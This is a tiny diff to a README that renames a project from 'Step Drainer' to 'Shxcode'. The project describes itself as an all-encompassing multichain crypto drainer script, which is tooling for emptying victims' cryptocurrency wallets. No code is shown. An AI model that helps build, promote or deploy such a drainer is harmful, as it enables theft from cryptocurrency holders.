@@ -1,5 +1,4 @@
-# Crypto Wallet Drainer
-# Step Drainer - Multichain Crypto Drainer Script
+# Shxcode - Multichain Crypto Drainer Script
 
 A single, all-encompassing crypto drainer script that can handle everything.
 
